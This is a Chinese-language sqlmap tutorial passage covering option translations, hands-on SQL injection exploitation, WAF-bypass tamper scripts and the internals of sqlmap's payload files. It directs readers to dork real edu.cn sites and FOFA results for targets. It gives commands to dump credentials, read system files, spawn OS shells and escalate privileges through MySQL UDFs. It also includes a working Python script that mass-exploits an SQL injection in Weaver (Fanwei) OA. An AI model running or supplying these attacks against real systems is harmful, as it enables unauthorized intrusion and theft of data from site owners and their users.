## 强制用于数据检索的字符编码

--crawl=CRAWLDEPTH Crawl the website starting from the target URL
## 从目标网址开始抓取网站

--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. "logout")
## 正则表达式排除网页抓取

--csv-del=CSVDEL Delimiting character used in CSV output (default ",")
## 分隔CSV输出中使用的字符

--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)
## 转储数据的格式

--eta Display for each output the estimated time of arrival
## 显示每个输出的预计到达时间

--flush-session Flush session files for current target
## 刷新当前目标的会话文件

--forms Parse and test forms on target URL
## 在目标网址上解析和测试表单

--fresh-queries Ignore query results stored in session file
## 忽略在会话文件中存储的查询结果

--hex Use DBMS hex function(s) for data retrieval
## 使用DBMS hex函数进行数据检索

--output-dir=OUT.. Custom output directory path
## 自定义输出目录路径

--parse-errors Parse and display DBMS error messages from responses
## 解析和显示响应中的DBMS错误消息

--save=SAVECONFIG Save options to a configuration INI file
## 保存选项到INI配置文件

--scope=SCOPE Regexp to filter targets from provided proxy log
## 使用正则表达式从提供的代理日志中过滤目标

--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)
## 根据有效负载和/或标题(e.g. ROW)选择测试

--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)
## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）

--update Update sqlmap
## 更新SqlMap
```

## 16、Miscellaneous（杂项）



```sh
Miscellaneous（杂项）:

-z MNEMONICS Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
## 使用简短的助记符

--alert=ALERT Run host OS command(s) when SQL injection is found
## 在找到SQL注入时运行主机操作系统命令

--answers=ANSWERS Set question answers (e.g. "quit=N,follow=N")
## 设置问题答案

--beep Beep on question and/or when SQL injection is found
## 发现SQL 注入时提醒

--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap
## 具体的UDF和表清理DBMS

--dependencies Check for missing (non-core) sqlmap dependencies
## 检查是否缺少（非内核）sqlmap依赖关系

--disable-coloring Disable console output coloring
## 禁用控制台输出颜色

--gpage=GOOGLEPAGE Use Google dork results from specified page number
## 使用Google dork结果指定页码

--identify-waf Make a thorough testing for a WAF/IPS/IDS protection
## 对WAF / IPS / IDS保护进行全面测试

--skip-waf Skip heuristic detection of WAF/IPS/IDS protection
## 跳过启发式检测WAF / IPS / IDS保护

--mobile Imitate smartphone through HTTP User-Agent header
##  通过HTTP User-Agent标头模仿智能手机

--offline Work in offline mode (only use session data)
## 在离线模式下工作（仅使用会话数据）

--page-rank Display page rank (PR) for Google dork results
##  Google dork结果显示网页排名（PR）

--purge-output Safely remove all content from output directory
##  安全地从输出目录中删除所有内容

--smart Conduct thorough tests only if positive heuristic(s)
## 只有在正启发式时才进行彻底测试

--sqlmap-shell Prompt for an interactive sqlmap shell
## 提示交互式 sqlmap shell

--wizard Simple wizard interface for beginner users
## 给初级用户的简单向导界面
```

--By Micropoor



## 17、SQLmap实际利用

参考资料：

- [超详细SQLMap使用攻略及技巧分享](https://www.freebuf.com/sectool/164608.html)

### 1.4 实际利用

#### 1.4.1 检测和利用SQL注入



**1.手工判断是否存在漏洞**

对动态网页进行安全审计，通过接受动态用户提供的GET、POST、Cookie参数值、User-Agent请求头。

原始网页：http://192.168.136.131/sqlmap/mysql/get_int.php?id=1

构造url1：http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1

构造url2：http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2

如果url1访问结果跟原始网页一致，而url2跟原始网页不一致，有出错信息或者显示内容不一致，则证明存在SQL注入。



**2. sqlmap自动检测**

检测语法：sqlmap.py -u http://192.168.136.131/sqlmap/mysql/get_int.php?id=1

技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断。





**3. 寻找和判断实例**

通过百度对“inurl:news.asp?id=site:edu.cn”、“inurl:news.php?id= site:edu.cn”、“inurl:news.aspx?id=site:edu.cn”进行搜索，搜索news.php/asp/aspx，站点为edu.cn，如图1所示。随机打开一个网页搜索结果，如图2所示，如果能够正常访问，则复制该URL地址。

[![超详细SQLMap使用攻略及技巧](assets/1520507686511.jpg!small)](https://image.3001.net/images/20180308/1520507686511.jpg)

图1搜索目标

[![图2测试网页能否正常访问.jpg](assets/15205077083421.jpg!small)](https://image.3001.net/images/20180308/15205077083421.jpg)

图2测试网页能否正常访问



 将该url使用sqlmap进行注入测试，如图3所示，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。本例中是不存在SQL注入漏洞。

[![图3检测URL地址是否存在漏洞.jpg](assets/15205077258489.jpg!small)](https://image.3001.net/images/20180308/15205077258489.jpg)

图3检测URL地址是否存在漏洞





**4. 批量检测**

将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap.py-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。

[![图4批量整理目标地址.jpg](assets/15205077458774.jpg!small)](https://image.3001.net/images/20180308/15205077458774.jpg)

图4批量整理目标地址



#### 1.4.2 直接连接数据库

sqlmap.py -d”mysql://admin:admin@192.168.21.17:3306/testdb” -f –banner –dbs–users



#### 1.4.3数据库相关操作

1.列数据库信息：–dbs

2.web当前使用的数据库–current-db

3.web数据库使用账户–current-user

4.列出sqlserver所有用户 –users

5.数据库账户与密码 –passwords

6.指定库名列出所有表  -D database –tables

-D：指定数据库名称

7.指定库名表名列出所有字段 -D antian365-T admin –columns

-T：指定要列出字段的表

8.指定库名表名字段dump出指定字段

-D secbang_com -T admin -C id,password ,username –dump

-D antian365 -T userb -C”email,Username,userpassword” –dump

 可加双引号，也可不加双引号。

9.导出多少条数据

-D tourdata -T userb -C”email,Username,userpassword” –start 1 –stop 10 –dump 

参数：

–start：指定开始的行

–stop：指定结束的行

此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。





### 1.5 SQLMAP实用技巧


#### 1. mysql的注释方法进行绕过WAF进行SQL注入

（1）修改C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py

return match.group().replace(word,”/*!0%s” % word) 为：

return match.group().replace(word,”/*!50000%s*/” % word)

（2）修改C:\Python27\sqlmap\xml\queries.xml

<cast query=”CAST(%s ASCHAR)”/>为：

<castquery=”convert(%s,CHAR)”/>

（3）使用sqlmap进行注入测试

sqlmap.py -u”http://**.com/detail.php? id=16″ –tamper “halfversionedmorekeywords.py”

其它绕过waf脚本方法：

sqlmap.py-u “http://192.168.136.131/sqlmap/mysql/get_int.php?id=1” –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3

（4）tamper目录下文件具体含义：

> space2comment.py用/**/代替空格
>
> apostrophemask.py用utf8代替引号
>
> equaltolike.pylike代替等号
>
> space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）
>
> greatest.py　绕过过滤’>’ ,用GREATEST替换大于号。
>
> space2hash.py空格替换为#号,随机字符串以及换行符
>
> apostrophenullencode.py绕过过滤双引号，替换字符和双引号。
>
> halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
>
> space2morehash.py空格替换为 #号 以及更多随机字符串 换行符
>
> appendnullbyte.py在有效负荷结束位置加载零字节字符编码
>
> ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’
>
> space2mssqlblank.py(mssql)空格替换为其它空符号
>
> base64encode.py　用base64编码替换
>
> space2mssqlhash.py　替换空格
>
> modsecurityversioned.py过滤空格，包含完整的查询版本注释
>
> space2mysqlblank.py　空格替换其它空白符号(mysql)
>
> between.py用between替换大于号（>）
>
> space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
>
> multiplespaces.py围绕SQL关键字添加多个空格
>
> space2plus.py用+替换空格
>
> bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like
>
> nonrecursivereplacement.py双重查询语句,取代SQL关键字
>
> space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集
>
> sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾
>
> chardoubleencode.py双url编码(不处理以编码的)
>
> unionalltounion.py替换UNION ALLSELECT UNION SELECT
>
> charencode.py　url编码
>
> randomcase.py随机大小写
>
> unmagicquotes.py宽字符绕过 GPCaddslashes
>
> randomcomments.py用/**/分割sql关键字
>
> charunicodeencode.py字符串 unicode 编码
>
> securesphere.py追加特制的字符串
>
> versionedmorekeywords.py注释绕过
>
> space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’
>
> halfversionedmorekeywords.py关键字前加注释

#### 2. URL重写SQL注入测试

value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。
```sh
sqlmap.py -u”http://targeturl/param1/value1*/param2/value2/”
```


#### 3. 列举并破解密码哈希值

 当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。
```sh
sqlmap.py -u”http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1” –passwords -v1
```


#### 4. 获取表中的数据个数
```sh
sqlmap.py -u”http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1” –count -Dtestdb
```


#### 5.对网站secbang.com进行漏洞爬取
```sh
sqlmap.py -u “[http://www.secbang.com](http://www.secbang.com/)“–batch –crawl=3
```


#### 6.基于布尔SQL注入预估时间
```sh
sqlmap.py -u “http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1“-b –eta
```


#### 7.使用hex避免字符编码导致数据丢失
```sh
sqlmap.py -u “http://192.168.48.130/pgsql/get_int.php?id=1” –banner –hex -v 3 –parse-errors
```


#### 8.模拟测试手机环境站点
```sh
python sqlmap.py -u”http://www.target.com/vuln.php?id=1” –mobile
```



#### 9.智能判断测试
```sh
sqlmap.py -u “http://www.antian365.com/info.php?id=1“–batch –smart
```


#### 10.结合burpsuite进行注入

（1）burpsuite抓包，需要设置burpsuite记录请求日志

sqlmap.py -r burpsuite抓包.txt

（2）指定表单注入

sqlmap.py -u URL –data“username=a&password=a”



#### 11.sqlmap自动填写表单注入

自动填写表单：

> sqlmap.py -u URL –forms
>
> sqlmap.py -u URL –forms –dbs
>
> sqlmap.py -u URL –forms –current-db
>
> sqlmap.py -u URL –forms -D 数据库名称–tables
>
> sqlmap.py -u URL –forms -D 数据库名称 -T 表名 –columns
>
> sqlmap.py -u URL –forms -D 数据库名称 -T 表名 -Cusername，password –dump


#### 12.读取linux下文件

 sqlmap.py-u “url” –file /etc/password


#### 13.延时注入

sqlmap.py -u URL –technique -T–current-user


#### 14. sqlmap 结合burpsuite进行post注入

结合burpsuite来使用sqlmap：

（1）浏览器打开目标地址[http://www.antian365.com](http://www.antian365.com/)

（2）配置burp代理(127.0.0.1:8080)以拦截请求

（3）点击登录表单的submit按钮

（4）Burp会拦截到了我们的登录POST请求

（5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下

（6）运行sqlmap并使用如下命令：

```
./sqlmap.py -r post.txt -p tfUPass
```

#### 15.sqlmap cookies注入

sqlmap.py -u “http://127.0.0.1/base.PHP“–cookies “id=1″ –dbs –level 2

默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值>=2的时候也会检查cookie里面的参数，当>=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：



```sh
sqlmap.py -u 注入点URL --cookie"id=xx" --level 3
sqlmap.py -u url --cookie "id=xx"--level 3 --tables(猜表名)
sqlmap.py -u url --cookie "id=xx"--level 3 -T 表名 --coiumns
sqlmap.py -u url --cookie "id=xx"--level 3 -T 表名 -C username，password --dump
```



####  16.mysql提权

（1）连接mysql数据打开一个交互shell:



```sh
sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --sql-shellselect @@version;select @@plugin_dir;d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\
```



（2）利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:



```sh
sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --file-write=d:/tmp/lib_mysqludf_sys.dll--file-dest=d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dllCREATE FUNCTION sys_exec RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'CREATE FUNCTION sys_eval RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'select sys_eval('ver'); 
```



#### 17.执行shell命令

sqlmap.py -u “url” –os-cmd=”netuser” /*执行net user命令*/

sqlmap.py -u “url” –os-shell /*系统交互的shell*/



#### 18.延时注入



```sh
sqlmap –dbs -u"url" –delay 0.5 /*延时0.5秒*/sqlmap –dbs -u"url" –safe-freq /*请求2次*/
```



#### 19.sqlmap 添加前缀后缀

- [【实战技巧】sqlmap不为人知的骚操作](https://blog.csdn.net/sun1318578251/article/details/102524100?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1)

**sqlmap参数：–prefix,–suffix**

在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。

例如，代码中是这样调用数据库的：

```php
$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 
```



这时你就需要–prefix和–suffix参数了：

```sh
python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
```

这样执行的SQL语句变成：

```php
$query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1"; 
```





 原博客中的poc：

```sh
sqlmap.py -r C:\Users\samny\Desktop\22.txt  --dbms oracle -p formids --prefix ")))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d" --suffix "order by (((1"

```





0x04 批量验证漏洞是否存在
首先使用FOFA收集一批url！

![在这里插入图片描述](assets/20191012165606241.png)



使用脚本验证！下面是效果图！结果又一定的失败率！

![在这里插入图片描述](assets/20191012170204491.png)
![在这里插入图片描述](assets/2019101217022854.png)
![在这里插入图片描述](assets/20191012170324527.png)





0x05 脚本源码
```python
#config=utf-8

import requests,json


def fanwei(urls):
    try:

        url = urls+"mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
        data = "formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 "


        headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Length": "2236",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests":"1"
                }
    
        info = requests.post(url,headers=headers,data=data,timeout=30)
        if info.status_code == 200:
            json_info = json.loads(info.text)
            if json_info == []:
                print(urls+" 不存在漏洞")
                with open("no.txt", 'a') as f:
                    f.write(urls + '\n')
            else:
                print(json_info)
                print(urls+" 存在漏洞")
                with open("ok.txt", 'a') as f:
                    f.write(urls + '\n')
        else:
            print(urls+"不存在漏洞")
            with open("no.txt", 'a') as f:
                f.write(urls + '\n')
    except requests.exceptions.HTTPError:
        print(urls+" --HTTPError")
        with open("error.txt", 'a') as f:
            f.write(urls + '\n')
    except requests.exceptions.ConnectionError:
        print(urls+" --ConnectionError")
        with open("error.txt", 'a') as f:
            f.write(urls + '\n')
    except requests.exceptions.Timeout:
        print(urls+" --Timeout")
        with open("error.txt", 'a') as f:
            f.write(urls + '\n')
    except json.decoder.JSONDecodeError:
        print(urls+" --JSONDecodeError")
        with open("error.txt", 'a') as f:
            f.write(urls + '\n')
fp=open("1.txt")
for line in fp:
    line = line.strip('\n')
    fanwei(str(line))

```



### 1.6 sqlmap 性能优化

这部分看做是对前面性能优化命令的补充说明，转载：[Sqlmap学习笔记（三）](https://www.cnblogs.com/dagger9527/p/11986551.html)



#### Sqlmap性能优化设置

1. Sqlmap设置持久HTTP连接，sqlmap默认是一次连接成功后马上关闭。

   HTTP报文中相当于Connection: Close（一次连接马上关闭）

   要扫描站点的URL比较多时，这样比较耗费性能，所以需要将HTTP连接持久化来提高扫描性能。

   HTTP报文相当于Connection: Keep-Alive

   如果在Sqlmap中设置的话，只需要加上***--keep-alive***参数

   ```powershell
   sqlmap -u "目标URL" --keep-alive
   ```

2. Sqlmap设置不接收Http Body（响应体）部分

   Body部分内容太大会增加HTTP响应延迟，如果只关心响应头部分内容，则可以设置空连接

   设置参数--null-connection

   ```powershell
   sqlmap -u "目标URL" --null-connection
   ```

3. Sqlmap设置多线程

   Sqlmap默认是单线程访问的，扫描的顺序串行执行，必须要等到上一次请求成功后才会执行后面的扫描，这样以来，扫描的效率就会低很多。因为网络连接是耗时操作，等待服务端响应的这段时间，Sqlmap就什么都做不了，本地的CPU、内存资源得不到有利的利用。而多个线程并行处理请求则可以有效的利用本地系统资源。

   但是设置线程太多也不好，因为线程越多，服务端的压力越大，可能会导致响应速度大幅度降低甚至出现丢包现象，导致请求无响应。所以Sqlmap最大只能设置10个线程。

   通过设置***--thread***参数设置线程数量

   ```powershell
   sqlmap -u "目标URL" --thread=10
   ```

4. Sqlmap设置预测输出

   用于检索并统计字符出现的次数

   参数：***--predict-output***

   与***--thread***相互冲突，它们不能同时被设置，比如同时指定***--predict-output***和***--thread***

   ```powershell
   sqlmap -u "http://test.dvwa.com/login.php" --predict-output --thread=3
   ```

   将会报以下错误

   ```verilog
   [23:10:15] [CRITICAL] switch '--predict-output' is incompatible with option '--threads' and switch '-o'
   ```

5. 通过***-o***可以开启所有性能优化的参数

6. 通过***--dbms***可以指定要扫描的数据库类型，默认判断是否是其它数据库

   ```powershell
   sqlmap -u "目标站点" --dbms=mysql
   ```



# Sqlmap自定义payload

参考：

- [从sqlmap源码看如何自定义payload](https://www.cnblogs.com/-hack-/p/12076603.html)
- [工具| Sqlmap Payload修改之路（上）](https://www.freebuf.com/column/161535.html)
- [工具| sqlmap payload修改之路（下）](https://www.freebuf.com/column/161797.html)
- [SQLMAP进阶使用](https://juejin.im/post/5aa116ae5188255589496029#heading-1)



## boundary

拿个例子看一下

```xml
    <boundary>
        <level>3</level>
        <clause>1</clause>
        <where>1,2</where>
        <ptype>1</ptype>
        <prefix>)</prefix>
        <suffix>[GENERIC_SQL_COMMENT]</suffix>
    </boundary>
```

> level 标签定义了注入的等级，用—level参数表示，等级越高使用的payload越多
>
> - 1：默认是1(<100 requests)
> - 2：大于等于2的时候也会测试HTTP Cookie头的值(100-200 requests)
> - 3: 大于等于3的时候也会测试User-Agent和HTTP Referer头的值(200-500 requests)
> - 4: (500-1000 requests)
> - 5: (>1000 requests)
>
> ptype 指 payload的类型
> prefix payload之前要拼接哪些字符
> suffix： payload之后拼接那些字符
> clause 指示了使用的查询语句的类型,可以同时写多个，用逗号隔开。
> [![img](assets/t01c7bdcb2379acb2e2.png)](https://p5.ssl.qhimg.com/t01c7bdcb2379acb2e2.png)
> where 如何添加 `  `，是否覆盖参数



clause和where 标签实际上是控制` 和 `能否拼接的，规则如下

当且仅当某个`boundary`元素的where节点的值包含`test`元素的子节点where的值(一个或多个)，clause节点的值包含test元素的子节点的clause的值(一个或多个)时候，该boundary才能和当前的test匹配生成最终的payload



## payload

下面看一下payload文件夹下的内容

```xml
    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause</title>
        <stype>1</stype>
        <level>1</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND [INFERENCE]</vector>
        <request>
            <payload>AND [RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>
```



> title=>title属性为当前测试Payload的标题，通过标题就可以了解当前的注入手法与测试的数据库类型
>
> stype=>查询类型
> level=>和前面一样
> risk=>风险等级，一共有三个级别，可能会破坏数据的完整性
> clause=>指定为每个payload使用的SQL查询从句，与boundary中一致
> where=>与boundary中一致
> vector=>指定将使用的注入模版
> payload=>测试使用的payload ,[RANDNUM]，[DELIMITER_START]，[DELIMITER_STOP]分别代表着随机数值与字符。当SQLMap扫描时会把对应的随机数替换掉,然后再与boundary的前缀与后缀拼接起来,最终成为测试的Payload。
> common=>payload 之后，boundary 拼接的后缀suffix之前
> char=>在union 查询中爆破列时所用的字符
> columns=>联合查询测试的列数范围
> response=>根据回显辨别这次注入的payload是否成功
> comparison=>使用字符串作为payload执行请求，将响应和负载响应进行对比，在基于布尔值的盲注中有效
> grep=>使用正则表达式去批结响应，判断时候注入成功，在基于错误的注入中有用
> time=>在基于time的注入中等待结果返回的所需要的时间
> detail=>下设三个子节点
> [![img](assets/t011a1ebd913f32a43b.png)](https://p0.ssl.qhimg.com/t011a1ebd913f32a43b.png)

最终的payload为

```
where + boundary.prefix+test.payload + test.common + +boundary.suffix
```

这两个文件实际上就是用来相互拼接的，而`where`和`clause` 决定着 boundary和test能否进行拼接，这两个文件的各个部分之间是多对多映射的关系

